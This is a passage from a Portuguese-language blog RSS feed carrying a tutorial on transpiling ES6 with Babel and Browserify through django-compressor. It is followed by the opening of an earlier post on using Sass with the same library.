o mesmo conceito e apresentar uma forma diferente de utilizar
a nova versão do Javascript
com o…]]></description><link>https://klauslaube.com.br/2016/06/20/django-e-es6-com-django-compressor.html</link><guid isPermaLink="false">https://klauslaube.com.br/2016/06/20/django-e-es6-com-django-compressor.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Mon, 20 Jun 2016 23:04:00 GMT</pubDate><content:encoded>&lt;p&gt;No &lt;a href=&quot;/2016/06/04/django-e-sass-com-django-compressor.html&quot; title=&quot;Django e Sass com django-compressor&quot;&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
falamos sobre como utilizar o &lt;a href=&quot;/tag/sass.html&quot; title=&quot;Leia mais sobre Sass&quot;&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
com o &lt;em&gt;framework&lt;/em&gt; &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;
através da biblioteca &lt;em&gt;Compressor&lt;/em&gt; (e sem necessitar de uma
ferramenta intermediária para &lt;em&gt;build&lt;/em&gt;). Nesse artigo, vamos utilizar
o mesmo conceito e apresentar uma forma diferente de utilizar
a nova versão do &lt;a href=&quot;/tag/javascript.html&quot; title=&quot;Leia mais sobre Javascript&quot;&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;
com o &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando e configurando o Compressor&lt;/h2&gt;
&lt;p&gt;Vamos recaptular o processo de instalação do &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install django-compressor&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não podemos esquecer de adicionar a &lt;em&gt;app&lt;/em&gt; ao &lt;code class=&quot;language-text&quot;&gt;INSTALLED_APPS&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;
INSTALLED_APPS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;compressor&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E para finalizar, precisamos fazer os estáticos serem &quot;encontráveis&quot;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;
STATICFILES_FINDERS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;django.contrib.staticfiles.finders.FileSystemFinder&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;django.contrib.staticfiles.finders.AppDirectoriesFinder&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;compressor.finders.CompressorFinder&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Para simplificar o nosso exemplo, vou reaproveitar o cenário criado no &lt;em&gt;post&lt;/em&gt;
anterior:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;django-html&quot;&gt;&lt;pre class=&quot;language-django-html&quot;&gt;&lt;code class=&quot;language-django-html&quot;&gt;&amp;lt;!-- index.html --&amp;gt;

{% load compress %}
{% load staticfiles %}

{% compress js %}
    &amp;lt;script src=&amp;quot;{% static &amp;#39;vendor/jquery/jquery.js&amp;#39; %}&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;quot;{% static &amp;#39;js/app.js&amp;#39; %}&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
{% endcompress %}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Imagine que o nosso arquivo &lt;code class=&quot;language-text&quot;&gt;js/app.js&lt;/code&gt; é um &lt;em&gt;Javascript&lt;/em&gt;, mas escrito seguindo as
especificações do &lt;a href=&quot;/tag/es6.html&quot; title=&quot;Leia mais sobre ES6&quot;&gt;&lt;em&gt;ES6&lt;/em&gt;&lt;/a&gt;. Podendo ser algo
semelhante ao exemplo abaixo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; createStore &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;redux&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; rootReducer &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./reducers&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; App &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./components/app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; store &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;createStore&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;rootReducer&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
store&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;subscribe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;subscriber&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O bloco de &lt;code class=&quot;language-text&quot;&gt;{% compress js %}&lt;/code&gt; será responsável por minificar e concatenar os nossos &lt;em&gt;scripts&lt;/em&gt;.
Se executarmos o comando &lt;code class=&quot;language-text&quot;&gt;manage.py compress&lt;/code&gt;, provavelmente não teremos nenhum problema,
e o &lt;a href=&quot;/tag/html.html&quot; title=&quot;Leia mais sobre HTML&quot;&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt; de resposta será algo parecido com isso:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;&amp;lt;!-- index.html --&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;/static/CACHE/js/3ffb288f8747.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mas o &lt;em&gt;ES6&lt;/em&gt; ainda não é amplamente suportado pelos navegadores... logo, teremos
que usar &quot;transpiladores&quot; para que o código seja traduzido em algo &quot;entendível&quot; pelos &lt;em&gt;browsers&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Hello NPM my old friend&lt;/h2&gt;
&lt;p&gt;Eu sinceramente desconheço uma ferramenta que faça &lt;a href=&quot;https://www.stevefenton.co.uk/2012/11/compiling-vs-transpiling/&quot; title=&quot;Compiling vs Transpiling&quot;&gt;&lt;em&gt;transpiling&lt;/em&gt;&lt;/a&gt;
de &lt;em&gt;ES6&lt;/em&gt; para &lt;em&gt;ES5&lt;/em&gt; melhor que o &lt;a href=&quot;https://babeljs.io/&quot; title=&quot;Use next generation JavaScript, today&quot;&gt;&lt;em&gt;Babel&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;E embora a gente &quot;torça o nariz&quot; para a necessidade de adicionar &lt;a href=&quot;/tag/node.html&quot; title=&quot;Leia mais sobre Node&quot;&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;
à nossa &lt;em&gt;stack&lt;/em&gt; &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, o uso do &lt;em&gt;Babel&lt;/em&gt; nessas condições faz
certo sentido. Primeiro, por nos permitir escrever &lt;em&gt;Javascript&lt;/em&gt;
numa versão mais prática, legível e divertida. Segundo, que com o auxílio do
&lt;a href=&quot;http://browserify.org/&quot; title=&quot;Browserify lets you require modules in the browser&quot;&gt;&lt;em&gt;Browserify&lt;/em&gt;&lt;/a&gt; (por exemplo),
podemos deixar a resolução de &lt;em&gt;path&lt;/em&gt; do &lt;em&gt;JS&lt;/em&gt; nas mãos da tríade &lt;em&gt;NPM/Browserify/Babel&lt;/em&gt;
(ou você achou que aquele &lt;code class=&quot;language-text&quot;&gt;import &amp;#39;redux&amp;#39;&lt;/code&gt; veio de graça?).&lt;/p&gt;
&lt;p&gt;Isso nos permite escrever &lt;em&gt;Javascript&lt;/em&gt; modular, utilizando recursos que já são &lt;em&gt;built-in&lt;/em&gt;
(na especificação) da linguagem, sem necessariamente nos preocuparmos em como resolveremos as
questões de importação (como por exemplo, se usaremos &lt;a href=&quot;http://requirejs.org/&quot; title=&quot;RequireJS is a JavaScript file and module loader&quot;&gt;&lt;em&gt;RequireJS&lt;/em&gt;&lt;/a&gt;
ou &lt;a href=&quot;https://github.com/cujojs/curl&quot; title=&quot;curl.js is small, fast, extensible module loader&quot;&gt;&lt;em&gt;curl.js&lt;/em&gt;&lt;/a&gt;)
e deixamos toda essa responsabilidade nas mãos da ferramenta de &lt;em&gt;bundling&lt;/em&gt; de sua escolha.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 620px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/dc950275e2c6d590b83a54d5a867fdc3/2a195/django-babel-auf-wiedersehen.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsSAAALEgHS3X78AAABqElEQVQY00VQW0sbQRSey5mdnZ3d7G5izEZysQGVavGGSL1D+54SsGpSMSiojQ/SKFITqUalGMGoiOCDDyL4WihtH/rU39azKW0PB+Yb5rucM4RSKgAiyvIsHXPsVNSPKOVpXZiZblbenxQL80O5npivhNnbFXMtC7jBGKftIoQSCcJVOqqdwPUyMT+qrYTrflpb+XF5/lSrtor58ssRTyolTcYYpX+6LaYhZJwDcBBgmEJyJuKO3n6b/3lzeTD/5nR5KT86nPXcdiZy2f9kRjlesMNiILhBGXTa6rhc+nV3+1Dd+XJ8tPl69kWHL4XJwxiB7v+SUQo8NMMDDIH2kPQijfLS96uLr6eN85Xi5LNsrjNhWzbS2+S/YuDCAOlqJ+75jEK4BGGM0P5M6np//6yysf5qsjAykIonkEkIvqGSIwjFOCyioMPvz6UJ4Yl40BWkp8bGt0vLd81WY7f2YXWjsrCYCZKGtKRUuKGBn8Mxn5FwWwamEHPjE9Wtvd2t+vXB52+tZv1d6XCn9nj/+LFaHxwYNZWd7e7r6R163jecTqY97bim/g2WwkJ29mDhJgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Django + Babel é como dar um Auf Wiedersehen para o ES5 (fallsdownz.blogspot.com.br)&amp;quot;&quot;
        title=&quot;Django + Babel é como dar um Auf Wiedersehen para o ES5 (fallsdownz.blogspot.com.br)&quot;
        src=&quot;/static/dc950275e2c6d590b83a54d5a867fdc3/2a195/django-babel-auf-wiedersehen.png&quot;
        srcset=&quot;/static/dc950275e2c6d590b83a54d5a867fdc3/8514f/django-babel-auf-wiedersehen.png 192w,
/static/dc950275e2c6d590b83a54d5a867fdc3/804b2/django-babel-auf-wiedersehen.png 384w,
/static/dc950275e2c6d590b83a54d5a867fdc3/2a195/django-babel-auf-wiedersehen.png 620w&quot;
        sizes=&quot;(max-width: 620px) 100vw, 620px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Django + Babel é como dar um Auf Wiedersehen para o ES5 (fallsdownz.blogspot.com.br)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Sem mais delongas, vamos instalar as dependências que precisaremos para o nosso exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;npm install --save-dev babelify babel-preset-es2015 redux&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dos pacotes acima, os mais fundamentais são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;babelify&lt;/code&gt;: Um &lt;a href=&quot;http://babeljs.io/docs/plugins/#transform&quot; title=&quot;Babel plugins&quot;&gt;&lt;em&gt;transform&lt;/em&gt;&lt;/a&gt; de &lt;em&gt;Babel&lt;/em&gt; para o &lt;em&gt;Browserify&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;babel-preset-es2015&lt;/code&gt;: Um &lt;em&gt;preset&lt;/em&gt; com um apanhado de &lt;em&gt;plugins&lt;/em&gt; necessários para compilar &lt;em&gt;ES2015&lt;/em&gt; para &lt;em&gt;ES5&lt;/em&gt;;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O pacote &lt;code class=&quot;language-text&quot;&gt;redux&lt;/code&gt; é apenas uma dependência utilizada pelo exemplo, e não
influencia diretamente no processo de &lt;em&gt;build&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para facilitar a comunicação entre o &lt;em&gt;Django&lt;/em&gt; e o &lt;em&gt;Babel&lt;/em&gt;, vamos criar um arquivo de configuração
&lt;code class=&quot;language-text&quot;&gt;.babelrc&lt;/code&gt;, na raíz do nosso projeto, com a seguinte configuração:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;presets&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;es2015&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Voltamos ao &lt;em&gt;Django&lt;/em&gt;, para terminar de configurar o nosso projeto.&lt;/p&gt;
&lt;h2&gt;Back to the Django&lt;/h2&gt;
&lt;p&gt;Como no exemplo do &lt;em&gt;post&lt;/em&gt; anterior, vamos utilizar a capacidade de setarmos
compiladores/transpiladores, no &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;, e passaremos a interpretar
os arquivos &lt;em&gt;Javascript&lt;/em&gt; utilizando o &lt;em&gt;Babel&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;
COMPRESS_PRECOMPILERS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;text/es6&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./node_modules/.bin/browserify {infile} -t babelify --outfile {outfile}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O &lt;em&gt;path&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;./node_modules/.bin/browserify&lt;/code&gt; é onde está o binário após ser instalado
via &lt;code class=&quot;language-text&quot;&gt;npm&lt;/code&gt;. Os parâmetros &lt;code class=&quot;language-text&quot;&gt;infile&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;outfile&lt;/code&gt; dizem respeito ao arquivo de entrada e
de saída, respectivamente.&lt;/p&gt;
&lt;p&gt;Agora basta voltarmos ao nosso &lt;em&gt;template&lt;/em&gt;, e adicionarmos o atributo &lt;code class=&quot;language-text&quot;&gt;type=&amp;quot;text/es6&lt;/code&gt; à
nossa &lt;em&gt;tag&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;django-html&quot;&gt;&lt;pre class=&quot;language-django-html&quot;&gt;&lt;code class=&quot;language-django-html&quot;&gt;&amp;lt;!-- index.html --&amp;gt;

{% load compress %}
{% load staticfiles %}

{% compress js %}
    &amp;lt;script src=&amp;quot;{% static &amp;#39;vendor/jquery/jquery.js&amp;#39; %}&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;quot;{% static &amp;#39;js/app.js&amp;#39; %}&amp;quot; type=&amp;quot;text/es6&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
{% endcompress %}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Agora é só ver o resultado através do comando &lt;code class=&quot;language-text&quot;&gt;python manage.py compress&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Tratando-se de uma aplicação em produção, onde é recomendado utilizar o &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;
com &lt;a href=&quot;http://django-compressor.readthedocs.io/en/latest/scenarios/#offline-compression&quot; title=&quot;Offline compression&quot;&gt;&lt;em&gt;offline compression&lt;/em&gt;&lt;/a&gt;,
a adição do &lt;em&gt;Browserify&lt;/em&gt; não impactará no tempo de resposta
do seu servidor. No entanto, é certo que o servidor local, levantado através do
&lt;code class=&quot;language-text&quot;&gt;manage.py runserver&lt;/code&gt;, leve um tempo maior para responder depois dessa adição.&lt;/p&gt;
&lt;p&gt;Na dúvida, não custa testar...&lt;/p&gt;
&lt;p&gt;Inicie utilizando o &lt;em&gt;Django&lt;/em&gt; com &lt;em&gt;Compressor&lt;/em&gt;. A partir do momento onde os
tempos de resposta tornem-se muito altos, opte por uma ferramenta que
&lt;a href=&quot;/2016/02/22/vivendo-sem-o-grunt.html&quot; title=&quot;Vivendo sem o Grunt&quot;&gt;execute o &lt;em&gt;build&lt;/em&gt; em paralelo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/babel/babelify&quot;&gt;&lt;em&gt;Babelify - Browserify transform for Babel&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://django-compressor.readthedocs.io/en/latest/&quot;&gt;&lt;em&gt;Django Compressor - Compresses linked and inline JavaScript or CSS into a single cached file&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Django e Sass com django-compressor]]></title><description><![CDATA[Eu sempre gostei da proposta do : Concatenar e comprimir
estáticos, utilizando como agrupadores os blocos da engine de templates
do Django.
Além de manter a declaração dos assets no HTML,
ele ainda abre uma margem interessante para quando você precisa customizar um grupo
de estáticos para uma…]]></description><link>https://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html</link><guid isPermaLink="false">https://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sat, 04 Jun 2016 16:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Eu sempre gostei da proposta do &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;: Concatenar e comprimir
estáticos, utilizando como agrupadores os blocos da &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt;
do &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.
Além de manter a declaração dos &lt;em&gt;assets&lt;/em&gt; no &lt;a href=&quot;/tag/html.html&quot; title=&quot;Leia mais sobre HTML&quot;&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt;,
ele ainda abre uma margem interessante para quando você precisa customizar um grupo
de estáticos para uma determinada página.&lt;/p&gt;
&lt;p&gt;Com a chegada dos pré-processadores, como &lt;a href=&quot;http://sass-lang.com/&quot; title=&quot;CSS with superpower&quot;&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
e &lt;a href=&quot;http://coffeescript.org/&quot; title=&quot;CoffeeScript is a little language that compiles into JavaScript&quot;&gt;&lt;em&gt;CoffeeScript&lt;/em&gt;&lt;/a&gt;,
e fatalmente com o advento das ferramentas de &lt;em&gt;build&lt;/em&gt;, deixar esse processo
para o &lt;em&gt;Django&lt;/em&gt; passou a ser questionável. É extremamente razoável passar toda
essa responsabilidade para o &lt;a href=&quot;/tag/grunt.html&quot; title=&quot;Leia mais sobre Grunt&quot;&gt;&lt;em&gt;Grunt&lt;/em&gt;&lt;/a&gt;,
e colocar apenas no seu &lt;em&gt;template&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; a &lt;em&gt;URL&lt;/em&gt; do estático já &quot;buildado&quot;.&lt;/p&gt;
&lt;p&gt;Na minha opinião, isso tira um pouco da vantagem descrita no primeiro parágrafo,
e adiciona certa complexidade à nossa &lt;em&gt;stack&lt;/em&gt; de desenvolvimento. Baseado nisso,
e indo na &lt;a href=&quot;/2016/02/22/vivendo-sem-o-grunt.html&quot; title=&quot;Vivendo sem o Grunt&quot;&gt;onda da simplificação de &lt;em&gt;build&lt;/em&gt;&lt;/a&gt;,
que eu resolvi devolver esse poder ao &lt;em&gt;Django&lt;/em&gt;.
E já te adianto: Estou relativamente satisfeito com o resultado!&lt;/p&gt;
&lt;h2&gt;Concat e minify sem Node.js&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Django Compressor&lt;/em&gt; é um &lt;em&gt;app&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; que comprime &lt;em&gt;Javascript&lt;/em&gt;
ou &lt;em&gt;CSS&lt;/em&gt;, em um único arquivo cacheável.&lt;/p&gt;
&lt;p&gt;Para usá-lo, começamos instalando através do &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::shell
$ pip install django-compressor&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Na sequência, precisamos adicioná-lo ao arquivo de configuração do seu projeto &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::python
# settings.py
INSTALLED_APPS = (
    ...
    &amp;#39;compressor&amp;#39;,
    ...
)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não esqueça de adicioná-lo ao &lt;code class=&quot;language-text&quot;&gt;STATICFILES_FINDERS&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::python
# settings.py
STATICFILES_FINDERS = (
    &amp;#39;django.contrib.staticfiles.finders.FileSystemFinder&amp;#39;,
    &amp;#39;django.contrib.staticfiles.finders.AppDirectoriesFinder&amp;#39;,
    ...
    &amp;#39;compressor.finders.CompressorFinder&amp;#39;,
)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E no seu &lt;em&gt;template&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt;, utilizamos a &lt;code class=&quot;language-text&quot;&gt;templatetag&lt;/code&gt; de compressão
para &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;::html
&amp;lt;!-- index.html --&amp;gt;

{% load compress %}
{% load staticfiles %}

{% compress css %}
    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;{% static &amp;#39;vendor/skeleton/normalize.css&amp;#39; %}&amp;quot; type=&amp;quot;text/css&amp;quot;&amp;gt;
